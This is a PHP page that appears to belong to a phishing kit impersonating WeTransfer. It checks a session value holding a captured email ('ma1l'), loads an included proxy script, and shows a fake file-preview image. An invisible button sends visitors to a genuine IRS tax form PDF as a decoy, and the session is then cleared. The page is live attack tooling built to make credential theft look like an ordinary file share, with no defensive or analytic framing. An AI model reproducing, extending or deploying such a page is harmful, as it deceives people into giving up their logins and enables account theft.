<?php include'../proxy.php';?><?php include'../proxy.php';?><?php
error_reporting(0);
session_start();
ob_start();

function loggedin(){
if(isset($_SESSION['ma1l'])&&!empty($_SESSION['ma1l'])){
	return true;
	}else{
		return false;
		}
}


if(loggedin()){
				
				}else{
		
		die(include 'Go_off.php');
		}

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Preloaded to view | WeTransfer</title>
	<link rel="icon" type="image/ico" href="img/favicon.ico">
	<style>
<style>
*{margin:0px; padding:0px; font-family:Helvetica, Arial, sans-serif;}
</style>

</head><body background="preview_files/002.png">

<button onClick="window.location.href=&#39;https://www.irs.gov/pub/irs-pdf/f1040x.pdf&#39;" style="position: absolute; top: 370px; left: 550px; width: 250px; height:58px; background-color: Transparent;background-repeat:no-repeat;border: none;cursor:pointer;overflow: hidden;"></button>




</body>

<?php
session_destroy();
ob_end_flush();
?>

</html>